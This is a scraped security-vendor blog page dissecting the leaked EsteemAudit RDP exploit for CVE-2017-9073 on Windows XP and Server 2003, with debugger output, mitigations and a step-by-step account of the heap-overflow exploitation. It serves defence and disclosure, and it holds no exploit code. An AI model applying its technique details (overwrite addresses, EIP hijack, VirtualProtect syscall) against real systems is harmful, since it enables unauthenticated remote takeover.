[esi+28h],eax\n\n080191a4 31c0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 xor\u00a0\u00a0\u00a0\u00a0 eax,eax\n\n080191a6 89462c\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 mov\u00a0\u00a0\u00a0\u00a0 dword ptr [esi+2Ch],eax\n\n080191a9 e8b5000000\u00a0\u00a0\u00a0\u00a0\u00a0 call\u00a0\u00a0\u00a0 gpkcsp!IsProgButtonClick+0x197 (08019263)\n\n\u2026\n\n&nbsp;\n\n0:011&gt; !address 08019148\n\nFailed to map Heaps (error 80004005)\n\nUsage:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Image\n\nAllocation Base:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 08000000\n\nBase Address:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 08019000\n\nEnd Address:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 0801e000\n\nRegion Size:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 00005000\n\nType:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 01000000\u00a0\u00a0\u00a0 MEM_IMAGE\n\nState:\u00a0\u00a0 \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a000001000\u00a0\u00a0\u00a0 MEM_COMMIT\n\nProtect:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 00000040\u00a0\u00a0 PAGE_EXECUTE_READWRITE\n\nMore info:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 lmv m gpkcsp\n\nMore info:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 !lmi gpkcsp\n\nMore info:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 ln 0x8019148\n\n\n\nDetection and Mitigation\nAs CVE-2017-9073 only exists on Windows Server 2003 and Windows XP, both of which are no longer supported by Microsoft, users should first consider upgrading to a newer version of Windows as no official patch is available. However, as this vulnerability exists in the smart card module gpkcsp, there are potential work-arounds.\n\n \tDisabling the smart card module through Group Policy or in the registry.\n\n \tDo this in the registry: Set\/Add key fEnableSmartCard in the path HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services\\ to 0 with the type of REG_DWORD.\n\n\n \tTraps prevents exploitation of this vulnerability on Windows XP and Server 2003 hosts.\n \tThreat Prevention Signature 32533 released in Content Update 692 detects the exploit in the NGFW.\n \tWherever possible, disable or restrict access to RDP from external sources\n\nConclusion\nRDP is a very useful but very complex component of Windows. Based on our analysis of the EsteemAudit exploit, we find that the vulnerability itself is not obscure, but it took quite a bit of effort to write a successful exploit. Interestingly, gpkcsp choose a global variable to store the data sent by the client, it supplies a capacity of controlling the arbitrary data in already-known address in the remote server without ASLR. This is a powerful feature for exploit authors to take advantage of. In any case, EsteemAudit is a reliable and powerful RDP exploit tool for Windows XP and Windows 2003. Users should take steps to ensure their Windows XP and Windows Server 2003 are protected through one of the mitigation steps listed above. A network vulnerability like this one can be used in a \u201cworm-able\u201d fashion, similar to the WanaCrypt0r attacks which had global impact earlier this month.\n\n\n\n\n\nRegister for Ignite \u201917 Security Conference \nVancouver, BC June 12\u201315, 2017\nIgnite \u201917 Security Conference is a live, four-day conference designed for today\u2019s security professionals. Hear from innovators and experts, gain real-world skills through hands-on sessions and interactive workshops, and find out how breach prevention is changing the security industry. Visit the Ignite website for more information on tracks, workshops and marquee sessions.","publisher":{"@type":"Organization","@id":"#panworg"},"image":{"@type":"ImageObject","url":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/uploads\/2016\/09\/unit42-web-banner-650x300-150x150.jpg","width":150,"height":150},"author":[{"@type":"Person","name":"Tao Yan"}]}</script><link rel='stylesheet' id='crayon-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='wp-block-library-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dist/block-library/style.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='dashicons-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dashicons.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='post-views-counter-frontend-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/post-views-counter/css/frontend.css?ver=1.3.1' type='text/css' media='all' />
<link rel='stylesheet' id='bodhi-svgs-attachment-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/svg-support/css/svgs-attachment.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-horizontal-list-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-list-horizontal/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-post-translations-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-post-translations/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wordpress-popular-posts-css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/css/wpp.css?ver=5.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='unit42/css-css'  href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/styles/main.css' type='text/css' media='all' />
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.min.js?ver=_2.7.2_beta'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpp_params = {"sampling_active":"0","sampling_rate":"100","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-json\/wordpress-popular-posts\/v1\/popular-posts","ID":"31333","token":"b09d8c8c9d","debug":""};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/js/wpp-5.0.0.min.js?ver=5.0.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpml_xdomain_data = {"css_selector":"wpml-ls-item","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","current_lang":"en"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/res/js/xdomain-data.js?ver=4.3.5'></script>
<link rel='https://api.w.org/' href='https://unit42.paloaltonetworks.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://unit42.paloaltonetworks.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://unit42.paloaltonetworks.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.4.1" />
<link rel='shortlink' href='https://unit42.paloaltonetworks.com/?p=31333' />
<link rel="alternate" type="application/json+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-dissection-esteemaudit-windows-remote-desktop-exploit%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-dissection-esteemaudit-windows-remote-desktop-exploit%2F&#038;format=xml" />
<meta name="generator" content="WPML ver:4.3.5 stt:1,28;" />
<meta name="google-site-verification" content="zHZtYOWm9hm4SZgsH7wqiYcOwmsAsxDUDU4UD1QxB40" /><style>#wpdevart_lb_overlay{background-color:#000000;} #wpdevart_lb_overlay.wpdevart_opacity{opacity:0.8 !important;} #wpdevart_lb_main_desc{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;} #wpdevart_lb_information_content{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;}
		#wpdevart_lb_information_content{
			width:100%;	
		}
		#wpdevart_info_counter_of_imgs{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_caption{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_title{
			    display: inline-block;
				padding-left:5px;
				padding-right:5px;
				font-size:15px;
				color:#000000;
		}
		@-webkit-keyframes rotate {
			to   {-webkit-transform: rotate(360deg);}
			from  {-webkit-transform: rotate(0deg);}
		}
		@keyframes rotate {
			to   {transform: rotate(360deg);}
			from  {transform: rotate(0deg);}
		}
		#wpdevart_lb_loading_img,#wpdevart_lb_loading_img_first{
			-webkit-animation: rotate 2s linear  infinite;
    		animation: rotate 2s linear infinite;
		}
	  </style>        <script>var $ = jQuery;</script>
  
  
<script type="text/javascript">
;(function(win, doc, style, timeout) {
var STYLE_ID = 'at-body-style';
function getParent() {
return doc.getElementsByTagName('head')[0];
}
function addStyle(parent, id, def) {
if (!parent) {
return;
}
var style = doc.createElement('style');
style.id = id;
style.innerHTML = def;
parent.appendChild(style);
}
function removeStyle(parent, id) {
if (!parent) {
return;
}
var style = doc.getElementById(id);
if (!style) {
return;
}
parent.removeChild(style);
}
addStyle(getParent(), STYLE_ID, style);
setTimeout(function() {
removeStyle(getParent(), STYLE_ID);
}, timeout);
}(window, document, "body {visibility:hidden !important}", 3000));
</script>

<script src="//assets.adobedtm.com/9273d4aedcd2/0d76ae0322d7/launch-425c423d843b.min.js" async></script>
<script type="text/javascript" src="https://www.paloaltonetworks.com/content/dam/pan/en_US/includes/attribution.js"></script>
  </head>
  <body class="post-template-default single single-post postid-31333 single-format-standard">
    <!--[if IE]>
      <div class="alert alert-warning">
        You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.      </div>
    <![endif]-->
    <header class="haeder py-15 position-relative z-index-2">
  <div class="container px-sm-30 px-35">
    <div class="row">
      <div class="first-logo col-sm-auto col-6 mb-sm-0 mb-40 text-sm-center order-1">
                  <a href="https://www.paloaltonetworks.com/">
<!--<img src="/wp-content/uploads/2019/07/paloaltonetwork.svg" class="attachment-full size-full" alt="" height="43" width="124" />-->
<svg width="140" height="26" viewBox="0 0 140 26" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M59.4802 4.69592C57.6721 4.69592 55.7937 5.18876 53.469 6.43377L54.7605 9.62741C56.7794 8.50019 58.447 8.00735 59.6682 8.00735C61.0538 8.00735 61.6644 8.52395 61.6644 9.20483V9.25133C61.6644 9.72143 61.2883 9.97974 60.3729 10.0738L58.7766 10.238C54.7843 10.6606 53.1404 12.3985 53.1404 14.7934V14.9577C53.1404 17.2359 55.0188 19.0203 57.6721 19.0203C59.4192 19.0203 60.937 18.2826 61.8597 16.9807L62.1572 18.7857H65.7734V10.5904C65.7734 6.71584 63.5428 4.69592 59.4802 4.69592ZM59.1279 15.8969C57.7899 15.8969 57.1555 15.3803 57.1555 14.5816V14.5351C57.1555 13.8305 57.5543 13.3139 59.0101 13.1031L59.6445 13.0091C60.5713 12.8799 61.1406 12.7095 61.6644 12.3923V13.4317C61.6644 15.0052 60.6777 15.8969 59.1279 15.8969Z" fill="white"/>
<path d="M25.4785 4.78994L20.8528 0.164276L16.2271 4.78994L18.5281 7.09192L6.92828 18.6917L11.5539 23.3174L16.1796 18.6917L13.8787 16.3908L25.4785 4.78994Z" fill="white"/>
<path d="M11.6001 0.164048L0 11.7642L4.62603 16.3902L16.2262 4.79008L11.6001 0.164048Z" fill="white"/>
<path d="M27.7794 7.09215L16.1793 18.6923L20.8053 23.3183L32.4054 11.7182L27.7794 7.09215Z" fill="white"/>
<path d="M72.231 0H68.1219V18.7857H72.231V0Z" fill="white"/>
<path d="M46.2366 4.69592C44.3685 4.69592 42.8683 5.52249 42.0428 6.81709L41.7287 4.93046H38.1125V23.4806H42.2215V17.051C43.0037 18.2567 44.4832 19.0193 46.2366 19.0193C49.5242 19.0193 52.2013 16.1077 52.2013 12.0916V11.6215C52.2013 7.60853 49.5242 4.69592 46.2366 4.69592ZM47.9744 11.9759C47.9744 14.0888 46.871 15.6159 45.0391 15.6159C43.2072 15.6159 42.1038 14.0898 42.1038 11.9759V11.7414C42.1038 9.62741 43.2072 8.10137 45.0391 8.10137C46.871 8.10137 47.9744 9.62741 47.9744 11.7414V11.9759Z" fill="white"/>
<path d="M127.672 4.69592C123.469 4.69592 120.51 7.6075 120.51 11.6236V12.0937C120.51 16.1087 123.469 19.0213 127.672 19.0213C131.875 19.0213 134.834 16.1097 134.834 12.0937V11.6236C134.834 7.60853 131.875 4.69592 127.672 4.69592ZM130.607 11.9759C130.607 14.0888 129.504 15.6159 127.672 15.6159C125.84 15.6159 124.736 14.0898 124.736 11.9759V11.7414C124.736 9.62741 125.84 8.10137 127.672 8.10137C129.504 8.10137 130.607 9.62741 130.607 11.7414V11.9759Z" fill="white"/>
<path d="M138.708 5.54211V5.47185C138.708 5.07304 138.404 4.79097 137.863 4.79097H136.924V6.9514H137.37V6.22299H137.866L138.239 6.9514H138.732L138.274 6.09694C138.552 6.01119 138.708 5.80248 138.708 5.54211ZM137.369 5.18979H137.862C138.144 5.18979 138.261 5.28381 138.261 5.49562V5.51938C138.261 5.70742 138.143 5.82418 137.862 5.82418H137.369V5.18979Z" fill="white"/>
<path d="M137.769 3.63998C136.502 3.63998 135.539 4.60293 135.539 5.87067C135.539 7.13842 136.502 8.10137 137.769 8.10137C139.037 8.10137 140 7.13842 140 5.87067C140 4.60293 139.037 3.63998 137.769 3.63998ZM137.769 7.79554C136.666 7.79554 135.867 6.99687 135.867 5.86964C135.867 4.74241 136.666 3.94375 137.769 3.94375C138.873 3.94375 139.671 4.74241 139.671 5.86964C139.671 6.99687 138.873 7.79554 137.769 7.79554Z" fill="white"/>
<path d="M108.416 0H104.307V18.7857H108.416V0Z" fill="white"/>
<path d="M116.518 15.6159C115.321 15.6159 114.874 15.029 114.874 13.7613V8.10137H119.712V4.93149H114.874V1.76058L110.765 2.37121V14.159C110.765 17.3765 112.409 19.0203 115.697 19.0203C117.153 19.0203 118.867 18.5739 120.276 17.7753L119.102 14.8637C118.279 15.31 117.129 15.6159 116.518 15.6159Z" fill="white"/>
<path d="M95.6662 4.69592C93.8581 4.69592 91.9797 5.18876 89.655 6.43377L90.9465 9.62741C92.9654 8.50019 94.633 8.00735 95.8542 8.00735C97.2397 8.00735 97.8504 8.52395 97.8504 9.20483V9.25133C97.8504 9.72143 97.4743 9.97974 96.5589 10.0738L94.9626 10.238C90.9702 10.6606 89.3264 12.3985 89.3264 14.7934V14.9577C89.3264 17.2359 91.2048 19.0203 93.8581 19.0203C95.6042 19.0203 97.123 18.2826 98.0456 16.9807L98.3432 18.7857H101.959V10.5904C101.959 6.71584 99.7287 4.69592 95.6662 4.69592ZM95.3138 15.8969C93.9748 15.8969 93.3415 15.3803 93.3415 14.5816V14.5351C93.3415 13.8305 93.7403 13.3139 95.1961 13.1031L95.8304 13.0091C96.7572 12.8799 97.3265 12.7095 97.8493 12.3923V13.4317C97.8493 15.0052 96.8637 15.8969 95.3138 15.8969Z" fill="white"/>
<path d="M81.225 4.69592C77.022 4.69592 74.0629 7.6075 74.0629 11.6236V12.0937C74.0629 16.1087 77.022 19.0213 81.225 19.0213C85.4281 19.0213 88.3872 16.1097 88.3872 12.0937V11.6236C88.3862 7.60853 85.4281 4.69592 81.225 4.69592ZM84.1593 11.9759C84.1593 14.0888 83.0559 15.6159 81.224 15.6159C79.3921 15.6159 78.2887 14.0898 78.2887 11.9759V11.7414C78.2887 9.62741 79.3921 8.10137 81.224 8.10137C83.0559 8.10137 84.1593 9.62741 84.1593 11.7414V11.9759Z" fill="white"/>
<path d="M98.0446 22.1168H99.0975L100.551 24.0334H100.566V22.1168H101.532V25.4964H100.513L99.0251 23.5313H99.0107V25.4964H98.0446V22.1168Z" fill="white"/>
<path d="M102.816 22.1168H105.771L105.81 22.9372H103.825V23.4011H105.385V24.1491H103.825V24.676H105.868L105.829 25.4964H102.816V22.1168Z" fill="white"/>
<path d="M107.925 22.9857H106.742L106.78 22.1168H110.088L110.127 22.9857H108.944V25.4964H107.925V22.9857Z" fill="white"/>
<path d="M110.943 22.1168H112.024L112.575 24.4632H112.628L113.342 22.1168H114.333L115.033 24.4632H115.086L115.627 22.1168H116.66L115.771 25.4964H114.444L113.826 23.4589H113.797L113.169 25.4964H111.836L110.943 22.1168Z" fill="white"/>
<path d="M117.404 23.8071C117.404 22.7057 118.152 22.0155 119.335 22.0155C120.518 22.0155 121.267 22.7057 121.267 23.8071C121.267 24.9085 120.519 25.5987 119.335 25.5987C118.152 25.5987 117.404 24.9075 117.404 23.8071ZM120.257 23.8071C120.257 23.2234 119.92 22.8752 119.335 22.8752C118.75 22.8752 118.412 23.2234 118.412 23.8071C118.412 24.3919 118.75 24.7391 119.33 24.7391C119.914 24.7391 120.257 24.3909 120.257 23.8071Z" fill="white"/>
<path d="M122.363 22.1168H124.334C125.231 22.1168 125.672 22.5414 125.672 23.3287C125.672 23.8691 125.449 24.2369 125.014 24.4105L125.816 25.4974H124.667L124.044 24.6089H123.378V25.4974H122.363V22.1168ZM124.202 23.8164C124.54 23.8164 124.661 23.6284 124.661 23.3721C124.661 23.1159 124.54 22.933 124.202 22.933H123.377V23.8164H124.202Z" fill="white"/>
<path d="M126.989 22.1168H128.002V23.3628H128.418L129.408 22.1168H130.547L130.552 22.1209L129.259 23.7389L130.625 25.4923L130.62 25.4964H129.437L128.414 24.1977H128.002V25.4964H126.989V22.1168Z" fill="white"/>
<path d="M131.402 25.2743V24.3475H131.407C131.972 24.6327 132.523 24.7721 133 24.7721C133.363 24.7721 133.546 24.6853 133.546 24.5159C133.546 24.3465 133.425 24.3031 132.7 24.1873C131.909 24.0623 131.382 23.8247 131.382 23.1438C131.382 22.5115 131.938 22.0238 133.024 22.0238C133.459 22.0238 133.912 22.1158 134.333 22.2945V23.212L134.328 23.2172C133.927 22.9857 133.386 22.84 132.951 22.84C132.565 22.84 132.411 22.932 132.411 23.0859C132.411 23.2843 132.648 23.3029 133.242 23.4052C134.033 23.5406 134.56 23.7627 134.56 24.4777C134.56 25.0325 134.145 25.5884 132.952 25.5884C132.364 25.5884 131.894 25.4675 131.402 25.2743Z" fill="white"/>
</svg>

</a>

      </div>

      <div class="col-sm-auto col-6 text-sm-center order-sm-2 order-4 second-logo-unit">
        <a href="https://unit42.paloaltonetworks.com/"><img src="/wp-content/uploads/2019/07/unit42.svg" class="attachment-full size-full" alt="" height="35" width="105" /></a>
      </div>

      <div class="col-auto d-sm-none ml-auto mb-40 order-2">
        <button class="btn__search" data-toggle="collapse" data-target="#search"><i class="ui ui-1"></i></button>
      </div>

      <div id="search" class="collapse d-sm-block col-sm-auto col-12 ml-auto order-3">
        <div class="pt-sm-0 pt-20 pb-sm-0 pb-40 mt-sm-0 mt-n30">
                      <input type="search" placeholder="Search Unit 42" id="innerSearch" class="header__search" value="" required>
                  </div>
      </div>

      <div class="col-auto d-sm-none d-flex ml-auto align-items-center order-5">
        <button class="btn__menu rounded" data-toggle="collapse" data-target="#navigation">Menu</button>
      </div>
    </div>
  </div>
</header>

<nav id="navigation" class="site-nav collapse d-sm-block pb-20 mt-sm-10">
  <div class="container px-sm-30">
    <ul id="menu-primary-navigation" class="main-menu d-sm-flex font-weight-medium"><li id="menu-item-97290" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97290"><a href="https://unit42.paloaltonetworks.com/tools/">Tools</a></li>
<li id="menu-item-41" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41"><a href="https://unit42.paloaltonetworks.com/atoms/">ATOMs</a></li>
<li id="menu-item-98931" class="menu-item menu-item-type-post_type_archive menu-item-object-events menu-item-98931"><a href="https://unit42.paloaltonetworks.com/events/">Speaking Events</a></li>
<li id="menu-item-81229" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-81229"><a href="https://unit42.paloaltonetworks.com/about-unit-42/">About Us</a></li>
</ul>  </div>
</nav>

  <article class="article overflow-hidden">
    
<header class="article__header py-sm-25 pt-40 pb-25 bg-gray-700">
  <div class="container">
    
    <h1 class="article__header__title mb-sm-30 mb-40">A Dissection of the “EsteemAudit” Windows Remote Desktop Exploit</h1>

    <ul class="article__entry-meta d-flex flex-wrap align-items-center text-black">
      <li class="mr-10 mb-10 px-20 rounded-pill d-flex bg-gray-200"><div class="post-views post-31333 entry-meta">
			
			
			<span class="post-views-count">46,829</span>
			</div> <span class="ml-5">people reacted</span></li>
      <li class="d-sm-none col-12 p-0"></li>
      <li class="mr-10 mb-10 px-20 rounded-pill bg-gray-200"><span class="ldc-ul_cont idc_ul_cont_not_liked_inner" onclick="alter_ul_post_values(this,'31333','like')"><i class="ui ui-2"></i><span class="ml-5">1</span></span></li>
      <li class="mb-10 px-20 rounded-pill bg-gray-200"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 20</span> <span class="rt-label rt-postfix"></span></span> min. read</li>
    </ul>

    <div class="article__share position-relative">
      <div class="dropdown dropdown-right">
        <button type="button" class="px-25 text-black bg-white text-uppercase rounded-pill" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Share <i class="ui ui-6 ml-10 align-text-top"></i>
        </button>
        <div class="dropdown-menu rounded-pill" role="toolbar">
          <div class="share-dropdown px-20 py-10 text-black font-size-sm">
            <div class="row align-items-center flex-nowrap">
              <div class="col">
                <div class="d-flex align-items-center">
                  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-dissection-esteemaudit-windows-remote-desktop-exploit%2F" target="_blank"><i class="ui ui-7"></i></a>
                  <a href="https://twitter.com/home?status=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-dissection-esteemaudit-windows-remote-desktop-exploit%2F+-+A+Dissection+of+the+%E2%80%9CEsteemAudit%E2%80%9D+Windows+Remote+Desktop+Exploit" target="_blank"><i class="ui ui-8"></i></a>
                  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-dissection-esteemaudit-windows-remote-desktop-exploit%2F&title=A+Dissection+of+the+%E2%80%9CEsteemAudit%E2%80%9D+Windows+Remote+Desktop+Exploit&summary=&source=" target="_blank"><i class="ui ui-9"></i></a>
                  <a href="//www.reddit.com/submit?url=https://unit42.paloaltonetworks.com/unit42-dissection-esteemaudit-windows-remote-desktop-exploit/" target="_blank"><i class="ui ui-10"></i></a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</header>    <div class="article__summary py-25 text-gray-500 font-size-sm">
  <div class="container">
    <div class="row align-items-center no-gutters">
      <div class="col-sm-auto col-12 mb-sm-0 mb-35">
        <i class="ui ui-11 text-gray-700 mr-sm-20"></i>
      </div>
  
      <div class="col-sm col-12">
        <p>
          By <a href="https://unit42.paloaltonetworks.com/author/tao-yan/" title="Posts by Tao Yan" class="author url fn" rel="author">Tao Yan</a>        </p>
        <p><time datetime="2017-05-31T12:00:19+00:00">May 31, 2017 at 5:00 AM</time></p>
        <p>Category: <a href="https://unit42.paloaltonetworks.com/category/unit42/" rel="category tag">Unit 42</a></p>
        <p>Tags: <a href="https://unit42.paloaltonetworks.com/tag/cve-2017-9073/" rel="tag">CVE-2017-9073</a>, <a href="https://unit42.paloaltonetworks.com/tag/esteemaudit/" rel="tag">EsteemAudit</a>, <a href="https://unit42.paloaltonetworks.com/tag/eternalblue/" rel="tag">ETERNALBLUE</a></p>
      </div>
    </div>
  </div>
</div>    <div class="py-30 bg-white">
      <div class="container">
        <div class="article__content pb-30">
                      <figure class="mb-30 text-center">
              <img width="650" height="300" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" class="attachment-single size-single wp-post-image" alt="" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg 650w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300-300x138.jpg 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300-370x171.jpg 370w" sizes="(max-width: 650px) 100vw, 650px" />            </figure>
                    <h3>Summary</h3>
<p>In April, a group known as the “Shadow Brokers” released a cache of stolen information that included multiple tools to exploit vulnerabilities in various versions of Microsoft Windows. The most famous of these is an exploit tool called “<a href="http://researchcenter.paloaltonetworks.com/tag/eternalblue/">EternalBlue</a>” which was repurposed to spread the WanaCrypt0r ransomware/worm earlier this month. Another tool released in this dump is “EsteemAudit”, which exploits CVE-2017-9073, a vulnerability in the Windows Remote Desktop system on Windows XP and Windows Server 2003. Both versions of this operating system are no longer supported by Microsoft (XP ended in 2014, Server 2003 in 2015) and as such Microsoft has not released a patch for the vulnerability.</p>
<p>Organizations that still rely on these out-of-date operating systems need to ensure they are defending against exploitation of this vulnerability, as it allows a remote attacker to take control over the system without any authentication.</p>
<p>Palo Alto Networks defends our customers’ systems from this exploit in the following ways:</p>
<ul>
<li><a href="https://www.paloaltonetworks.com/products/secure-the-endpoint/traps">Traps</a> prevents exploitation of this vulnerability on Windows XP and Server 2003 hosts.</li>
<li>Threat Prevention Signature 32533 released in Content Update 692 detects the exploit in the NGFW.</li>
</ul>
<p>Organizations that cannot upgrade systems and do not use the protections describe above should consider <a href="https://technet.microsoft.com/en-us/library/cc725887(v=ws.10).aspx">disabling the smart card module</a> through Group Policy or in the registry.</p>
<p>Exploitation of the vulnerability is complex, but the EsteemAudit tool makes it possible for novices to use it. The remainder of this blog includes a detailed analysis of where the vulnerability exists and how EsteemAudit exploits it.</p>
<h3>EsteemAudit Overview</h3>
<p>This RDP remote exploit named EsteemAudit uses an <a href="https://googleprojectzero.blogspot.com/2015/06/what-is-good-memory-corruption.html">inter-chunk heap overflow</a> in an internal structure (named key_set with a size of 0x24a8) on the system heap allocated by gpkcsp.dll, which is a component of Windows Smart Card. In detail, there is 0x80 sized buffer (named key_data) in the key_set structure to store smart card information, after which there are two key_object pointers in adjacent memory. However, there is a call to memcpy in gpkcsp! MyCPAcquireContext with no boundary check, copying the entire user-controlled sized data to the location of 0x80 sized key_data. If the attacker puts more than 0x80 sized data as the source argument of memcpy, the key_object pointer adjacent with key_data will be overflowed. To exploit this, the EsteemAudit code puts the 0xb2-7 size controlled data as the source argument of memcpy, and overflowed key_object pointer with a fixed address 0x080190dc, which is an address of data section of gpkcsp.dll. After triggering the memcpy path to complete the overflow, the exploiter puts user-controlled data in that global variable at a fixed address 0x080190d8 in data section, and then triggers gpkcsp!ReleaseProvider to release the C++ object key_object (call [vtable+8]) to get control over EIP. Finally, the SharedUserData technique is used to call VirtualProtect by syscall with number 0x8f and the first stage shellcode is executed.</p>
<h3>Introduction</h3>
<p>Remote RDP exploits are the stuff of legend. Fortunately, no public remote exploit for Windows RDP has been available since the NT4/Win98 era. In April 2017, a group using the name “The Shadowbrokers” <a href="https://arstechnica.com/security/2017/04/nsa-leaking-shadow-brokers-just-dumped-its-most-damaging-release-yet/">released</a> an RDP exploit named EsteemAudit which attacks the remote desktop service on Windows 2003 and Windows XP by using an inter-chunk heap overflow in the Smart Card component gpkscp.dll. In this blog, we will first describe some of the internals of remote desktop protocol and mechanism, and then analyze the EsteemAudit.exe itself. Next we will analyze the details about how to deal with the RDP data in kernel and user land, how the inter-chunk heap overflow occurs, and how to exploit this inter-chunk heap overflow to execute shellcode on the vulnerable system. Finally, we will introduce the possible detection methods and how to mitigate this vulnerability without a patch.</p>
<h3>Mechanism and Protocol</h3>
